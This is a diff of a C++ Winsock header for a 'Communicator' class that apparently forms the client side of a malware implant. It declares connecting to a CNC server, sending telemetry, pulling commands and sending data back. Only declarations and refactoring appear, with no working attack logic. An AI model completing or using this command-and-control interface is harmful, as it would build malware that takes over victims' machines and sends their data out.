@@ -1,12 +1,15 @@
 #pragma once
-#pragma comment(lib, "ws2_32.lib")
+#pragma warning(disable:4996) 
 
 #include <WinSock2.h>
-#include <stdio.h>
-#include <stdlib.h>
 #include <Windows.h>
+#include <ws2tcpip.h>
+#include <stdlib.h>
+#include <stdio.h>
 #include <iostream>
 #include <string>
+
+#pragma comment (lib, "Ws2_32.lib")
 
 namespace CommunicationHandler {
 
@@ -18,23 +21,23 @@ namespace CommunicationHandler {
 	class Communicator
 	{
 		private:
-			const int  MAXIMUM_CONNECTION_ATTEMPTS = 15;
+			const int MAXIMUM_CONNECTION_ATTEMPTS = 15;
+
 			SOCKADDR_IN cncInformation = { 0 };
 			SOCKET connectionSocket = INVALID_SOCKET;
 			WSADATA wsaData = { 0 };
+			WORD dllVersion = MAKEWORD(2, 2);
 
 		public:
 			Communicator(std::string cncIp, int cncPort);
 
 			bool connectToCnc();
-			void SendTelemetry();
-			bool isConnectionValid();
-			void pullCommand();
-			void sendDataToCnc();
-			bool DisconnectFromCnc();
+			void sendTelemetry();
+			bool pullCommand(char* buffer, size_t bufferLength);
+			bool sendDataToCnc(const char* buffer);
+			bool disconnectFromCnc();
 
 			~Communicator();
-
-		};
+	};
 
 }
